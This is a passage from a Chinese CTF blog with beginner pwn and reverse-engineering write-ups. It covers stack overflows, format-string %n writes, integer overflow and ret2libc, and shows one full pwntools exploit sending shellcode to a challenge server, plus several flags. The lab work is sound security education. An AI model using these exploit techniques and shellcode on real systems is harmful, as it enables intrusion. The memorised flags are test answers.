class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);<span class="comment">//正常，没有漏洞</span></span><br><span class="line"><span class="built_in">printf</span>(str);<span class="comment">//%x将对应的内存地址泄露出来</span></span><br><span class="line"><span class="comment">//任意内存读写需要用到格式化字符串%s</span></span><br></pre></td></tr></table></figure><p>我们就可以用这个去查看内存地址啦<br><img src="https://img-blog.csdnimg.cn/20210308205901432.png" alt="在这里插入图片描述"><br>先检查了一下地址，PIE没有开启，这样子的化，pwnme的地址是不变的，我们就需要去改变pwnme的地址了，这里是利用%n，%n:将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置。<br><img src="https://img-blog.csdnimg.cn/202103082117315.png" alt="在这里插入图片描述"><br>偏移量是10，我们再找到pwnme的地址，就开始写脚本了。<br><img src="https://img-blog.csdnimg.cn/20210308212844221.png" alt="在这里插入图片描述"><br>后面的 ==’aaaa%10$n’== 这个中间的4个a是为了凑成8个数，32位的地址算4个数，再加4个a就凑成了8这个数.<br><img src="https://img-blog.csdnimg.cn/20210308213118107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就有了。</p><hr /><h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h1><p>先来看看main主函数：</p><p><img src="https://img-blog.csdnimg.cn/20210121173524458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再来去追踪一下这两个变量，看看他们储存的距离：<br><img src="https://img-blog.csdnimg.cn/20210121172552492.png" alt="在这里插入图片描述"><br>是个栈溢出的题，然后脚本如下：<br><img src="https://img-blog.csdnimg.cn/20210308192418659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>remote就是远程连接一个端口，payload就是我们要输入的破解代码，sendlineafter可以拆开英文单词理解，直到遇到bof后送出payload这个（其实就是输入）interactive就是要进行交互了。<br>can only concatenate str (not “int”) to str；此时出现个这个错误，发现了其它的网上的一些脚本也会出现一些其它的错误，大都是这个，它的报错就是表示没有做数据类型的转换。知识点上有关其详细解释。<br><img src="https://img-blog.csdnimg.cn/20210308192243512.png" alt="在这里插入图片描述"><br>flag就出现了。</p><hr /><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>是个32位的文件，先看一下保护措施：<br><img src="https://img-blog.csdnimg.cn/20210221192627286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再用ida打开看一下吧：<br><img src="https://img-blog.csdnimg.cn/20210221192758547.png" alt="在这里插入图片描述"><br>去追踪一下：<br><img src="https://img-blog.csdnimg.cn/20210221193057869.png"><br>存在栈溢出，而通过字符串搜索会有个提示，而根据这个就可以写脚本了<img src="https://img-blog.csdnimg.cn/20210308193640410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就是构成system(“/bin/sh”)这条语句啦。<br><img src="https://img-blog.csdnimg.cn/20210308204340991.png" alt="在这里插入图片描述"><br>然后就尝试利用脚本进行攻击了！<br><img src="https://img-blog.csdnimg.cn/20210308204418500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就有了。</p><hr /><h1 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h1><p>打开有来波分析，看看是什么漏洞。<img src="https://img-blog.csdnimg.cn/2021030821404452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析到了 ，我们就可以开始下一步了，对了，记得checksec一下，看看有没有什么保护措施，不过我就不上图了，没有开启PIE保护的，我们看一下v4和v5的所在地址。<img src="https://img-blog.csdnimg.cn/20210308214510647.png" alt="在这里插入图片描述"><br>此时我们就可以开始写脚本了。<br><img src="https://img-blog.csdnimg.cn/20210308222707443.png" alt="在这里插入图片描述"><br>运行起来它。<br><img src="https://img-blog.csdnimg.cn/20210308222849268.png" alt="在这里插入图片描述"><br>这样子flag就出现了。<img src="https://img-blog.csdnimg.cn/20210308223441535.png" alt="在这里插入图片描述"><br>flag在上。</p><hr /><h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>打开直接先EP，再ida打开分析代码，分析一下是个说什么样的漏洞：<br><img src="https://img-blog.csdnimg.cn/20210309190207233.png" alt="在这里插入图片描述"><br>我们打开发现有个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br></pre></td></tr></table></figure><p>说明是个栈溢出漏洞，字符串搜索又发现了system和/bin/sh这两个极具特色的字符串。<br><img src="https://img-blog.csdnimg.cn/20210309190537557.png" alt="在这里插入图片描述"><br>与<br><img src="https://img-blog.csdnimg.cn/20210309190508694.png" alt="在这里插入图片描述"><br>然后我们可以开始编写脚本了，不过在此之前我们checksec一下<br><img src="https://img-blog.csdnimg.cn/20210309190919938.png" alt="在这里插入图片描述"><br>然后上脚本<br><img src="https://img-blog.csdnimg.cn/20210309192531725.png" alt="在这里插入图片描述"><br>跑起来进行一下。<br><img src="https://img-blog.csdnimg.cn/20210309192700905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不错，flag就出来了。</p><hr /><h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p>提示是有关溢出的。<br>我们看一下ida，发现是个套娃。<br><img src="https://img-blog.csdnimg.cn/20210309193247797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就进入login()函数里面看看<br><img src="https://img-blog.csdnimg.cn/20210309193421124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们再看看check_passwd()函数里面的检查内容。<br><img src="https://img-blog.csdnimg.cn/20210309193627250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析了这么久，一直在想这么成功，却忘了我们的目的是flag。<br><img src="https://img-blog.csdnimg.cn/20210309194233780.png" alt="在这里插入图片描述"><br>而在字符串搜索中发现了cat flag这个特殊的字符，所以我们要栈溢出，不过我也进行了计算s的长度为25，buf为409，想要溢出s的长度和buf的长度都是不够的。==但是== dest它想要实现栈溢出距离较短，而check_passwd()函数里的Success是有 ==result = strcpy(&amp;dest, s);== 这个溢出的，所以我们只要到达这里才行，而上面的if判断语句是判断buf的长度的，不过v3是int8位，最大是255，这里我们是整数溢出，260~264之间就行。<br><img src="https://img-blog.csdnimg.cn/20210309200755144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>来来来，跑起来，我们运行起来看看。<br><img src="https://img-blog.csdnimg.cn/20210309201040411.png" alt="在这里插入图片描述"><br>flag起来了。</p><hr /><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><p>字符串？不知道，我们用ida分析一下，然后就是文字游戏，确实挺长的，是挺难的。新手区最难题。<br><img src="https://img-blog.csdnimg.cn/2021030920420927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们进去flag函数里看看，发现有三个函数，分为三步，第一步比较简单，直接看第二步（第二个函数）<br><img src="https://img-blog.csdnimg.cn/20210309204808450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个是可以进行修改地址里的数据的，我们再来看看最后一步<br><img src="https://img-blog.csdnimg.cn/20210309205131517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先看上面，最后的一条语句，就是执行read里面的内容，嗯下面，这里就是在main函数里的v3和v3[1]相等，但我们知道它不相等，所以我们就要用格式化字符串漏洞修改它的值。<br><img src="https://img-blog.csdnimg.cn/20210309210811331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以写脚本了，对了，checksec一下，它是开起canary保护，栈步可以执行，所以我们要实时对它进行获取信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">59123</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">address = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name be:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;up?:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;east&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;leave(0)?:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;an address&#x27;&quot;</span>)</span><br><span class="line">rr.sendline(<span class="built_in">str</span>(address))</span><br><span class="line">payload = <span class="string">&#x27;%85c%7$n&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;wish&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;SPELL\n&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span><span class="comment">#asm(shellcraft.sh())</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210309230702116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就出现了，不过还是要补充一下里面的知识点。下面会说！</p><hr /><h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><p>先PE，再ida分析一下代码，不着急看它的保护措施，先看代码，做到心中有数。64位的，srand函数是设置随机数种子。<img src="https://img-blog.csdnimg.cn/20210310155537860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这里我想的是gets漏洞直接溢出到eip修改成flag函数的地址。所以我们就要查看一下它的保护措施：<br><img src="https://img-blog.csdnimg.cn/20210310160056731.png" alt="在这里插入图片描述"><br>NX和PIE和金丝雀都有，所以我们就不能修改eip的地址，除非前面有信息泄露，不过在栈中能够看到seed再var_30后面，所以可以溢出到seed这里修改随机种子，进而通过得到flag。<img src="https://img-blog.csdnimg.cn/20210310160735512.png" alt="在这里插入图片描述"><br>ldd：列出动态库依赖关系。这样子我们在能知道它的随机数是通过上面算法控制的。<br><img src="https://img-blog.csdnimg.cn/20210310161707583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>脚本如上，<strong>LoadLibrary</strong> 是将指定的模块加载到调用进程的地址空间中。指定的模块可能会导致其他模块被加载。<br><strong>ctypes</strong> 是Python的一个外部库，提供和C语言兼容的数据类型，可以很方便地调用DLL中输出的C接口函数。<br><img src="https://img-blog.csdnimg.cn/20210310162057763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就得到了。脚本是c和python混合代码，补充一点：<br><strong><em>DLL</em></strong> 是Dynamic Link Library的缩写，意为动态链接库。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。</p><hr /><h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><p>EP再ida不说了，一般我是先ida分析代码，逆向带给我的习惯。<br><img src="https://img-blog.csdnimg.cn/20210310191724662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在函数列表里还有个pwn函数，不过没什么用，这个是个构造shellcode的题，我们可以看看它的保护措施。<br><img src="https://img-blog.csdnimg.cn/20210310192026683.png" alt="在这里插入图片描述"><br>此时我们再来看看hello函数里面的内容是些什么。<br><img src="https://img-blog.csdnimg.cn/20210310192156111.png" alt="在这里插入图片描述"><br>刚开始我还想一步一步看看它是这么区运行的，都是逆向的思维。其实是不用的，我们可以直接区找system这个函数，或者(‘/bin/sh’)这个特殊的字符串。通过搜索字符串是可以找到system这个函数的，不过差个(‘/bin/sh’)，但是我们有两个输入的，所以我们就可以通过这两个输入进行攻击。<br><img src="https://img-blog.csdnimg.cn/2021031020595982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后跑起来，运行它一下。<br><img src="https://img-blog.csdnimg.cn/20210310210111218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子flag就出来啦，在这个过程中我要说明一点，刚开始我说pwn没什么用，事实证明我错了。有用有很大用，通过搜索字符串得到的system是在LOAD上，不是在.text上，而pwn上的system是在.text上。</p><hr /><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>这个附件是在压缩包里。ida打开一下，加载有点慢，可能是程序有点旧。但是事实又证明我错了，加载开F5不关用，这时我想起我用EP探测时提醒我用winrar，说的没错，我该用其解压一下。然后有两个文件，看看level3这个文件。<img src="https://img-blog.csdnimg.cn/20210310211342501.png" alt="在这里插入图片描述"><br>此时我们就进去看看到底有些什么。<br><img src="https://img-blog.csdnimg.cn/20210310211434681.png" alt="在这里插入图片描述"><br>很明显啦，不过还是要找找system语句，并且看看有没有什么保护。<br><img src="https://img-blog.csdnimg.cn/20210310211612361.png" alt="在这里插入图片描述"><br>发现NX开启，说明栈不可执行，就是我们没办法构造我们自己的shellcode啦。到这里发现确实有点难(不是一点难)，所以这时还有另一个文件，说明它要在本地中运行起来，和逆向很像。<br><strong><em>libc是Linux下的ANSI C的函数库</em></strong> 补充知识点。<br>程序本身没有什么语句，但是有个动态库，所以我们就要用到这个动态库了，在这个动态库中找到我们要用到的system和(“/bin/sh”)这两条语句。<br><img src="https://img-blog.csdnimg.cn/20210310213014237.png" alt="在这里插入图片描述"><br>同理可以找到system的位置0003A940这个，但是(‘/bin/sh’)这个位置是比较难找到的，所以我们可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -at x libc_32.so.6 | grep bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>查看动态库是否存在我们需要的字符串以及它在库中的相对位置，其实system也可以用这条语句来进行查找。<br>或者用libc.search(“/bin/sh”).next()这条语句来进行脚本中搜索。<br><img src="https://img-blog.csdnimg.cn/20210310213903914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当然搜索write也是可以的。这里再补充一个plt表got表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt表为（Procedure Link Table），是程序链接表。而got表为（Global Offset Table），是一个存储外部库函数的表，全局偏移表。</span><br><span class="line">对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用。</span><br><span class="line">当调用一个函数时候，会调用plt，然后plt调用got表，如果是动态链接，got表会从libc库里找这个函数。</span><br><span class="line">当然我们可以先泄露write函数的got表的地址，然后通过write-system&#x3D;libc中write函数和system函数的差值找到system函数，同理找到&#x2F;bin&#x2F;sh字符串</span><br></pre></td></tr></table></figure><p>symbols是函数的调用地址，对于在程序内部的一个方法，symbols地址就是方法的入口地址，对于外部通过动态链接的方法，symbols地址就是其plt地址。也对应着got地址。<br>来说说思路，利用两次栈溢出，一次用write函数获得地址，然后再次回到read这里进行攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(int fd, const void *buf, size_t nbyte)</span><br><span class="line">fd：文件描述符；</span><br><span class="line">buf：指定的缓冲区，即指针，指向一段内存单元；</span><br><span class="line">nbyte：要写入文件指定的字节数；</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210310234659202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>脚本写了好长时间，参考了许多大师傅们的wp，再加上自己的理解，终于写出脚本了。跑起来试试。<br><img src="https://img-blog.csdnimg.cn/20210310234911878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>哎，pwn不容易！</p><hr /><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>pwn的脚本里发现有些会运行出错，我查了好多资料才搞懂，现在的pwntools已经更新到了python3版本，而python2版本是没办法去下载了（很难）还有一条语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">4</span> + p64(<span class="number">123</span>)</span><br></pre></td></tr></table></figure><p>这条语句会出错，在python2版本中是不存在这种问题的，所以我们就要想办法能够顺利运行起来，str()强制转换是没办法的，python3对字符串相加增加了一些要求，这时我们就想办法进行编码，Ascll编码是不行的，发现了iso-8859-1这个编码是可以的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">4</span> + p64(<span class="number">123</span>).decode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>接下来再说说编码的问题，这个问题挺大的，因为网上现有的都是python2的版本，很少有python3的版本，现在python2版本又不更新，我们用python3版本又一直出现这个问题，所以我们必须要解决这个大问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bytes object---&gt;b &#x3D; b&quot;example&quot;</span><br><span class="line">str object---&gt;s &#x3D; “example”</span><br><span class="line">str to bytes---&gt;bytes(s, encoding &#x3D; “utf8”)</span><br><span class="line">bytes to str---&gt;str(b, encoding &#x3D; “utf-8”)</span><br><span class="line">str to bytes---&gt;str.encode(s)</span><br><span class="line">bytes to str---&gt;bytes.decode(b)</span><br></pre></td></tr></table></figure><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1822712479&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easyre-153 &amp; notsequence &amp; Replace</title>
      <link href="posts/884863d2/"/>
      <url>posts/884863d2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h1><p>这次用到了EP，平时我都不用，没想到这时用到了，不过打比赛时要用到，以防万一。<br><img src="https://img-blog.csdnimg.cn/20210305174935564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后upx去壳。<img src="https://img-blog.csdnimg.cn/20210305175206256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就可以用ida打开它啦，没想到第一次去壳没去好，得再去一遍才行。直接找到mian函数：<img src="https://img-blog.csdnimg.cn/20210305180340826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><em>pipe</em></strong> 是个linus编程函数，是个管道，也就是一种把两个进程之间的标准输入和标准输出连接起来的机制，从而提供一种让多个进程间通信的方法。<br>复刻（英语：fork，又译作派生、分支）是UNIX或类UNIX中的分叉函数，**<em>fork**</em> 函数将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。这两个进程中的线程继续执行，就像是两个用户同时启动了该应用程序的两个副本。<br>对了write是写入，就好像赋值一样，read就是读取，也可以理解为输入。<br>此时我们看看not_flag这个函数，也就是lol函数，因为我改了一下名字：<br><img src="https://img-blog.csdnimg.cn/20210305181130815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们写个脚本，也是个猜测，因为也没什么明显的提示，所以我们猜测最后会输出flag，因为它最后说你获得了key，也就是flag：<br><img src="https://img-blog.csdnimg.cn/20210305183500623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过flag是==RCTF{rhelheg}==</p><hr /><h1 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h1><p>EP了一下，没有加壳。那我们就用ida打开它，直接找到main函数：<br><img src="https://img-blog.csdnimg.cn/20210306170424115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们来看看着两个函数，先来第一个：<br><img src="https://img-blog.csdnimg.cn/20210306172047559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实到这里的数据就变成了1，2，4，8，16……了，此时我们再来看看第二个函数：<br><img src="https://img-blog.csdnimg.cn/20210306173639673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后总结一下，v2是20，也就是第一个函数赋值是20，并且里面也说明数据为1，2，4，8，16…等，第二个函数，其实也就是1+1=2，1+2=3，2+2=4，2+3=6。<br>hint：上面有个图标错了，就是第二个函数的图，它其实a1[v3*(v3+1)][i]这样子的，它也就是个杨辉三角，20位的杨辉三角：<br><img src="https://img-blog.csdnimg.cn/20210306175007143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么此时flag就有了。<br><strong><em>RCTF{37894beff1c632010dd6d524aa9604db}</em></strong><br>嗯</p><hr /><h1 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h1><p>打开是个rar的压缩包，刚开始看的文件名有点长，没看到后缀名，以为直接是个文件，直接逆向，实力眼瞎！！！<br>哈哈，解压是个exe文件，用EP看看：<br><img src="https://img-blog.csdnimg.cn/20210307195735964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后去壳它：<br><img 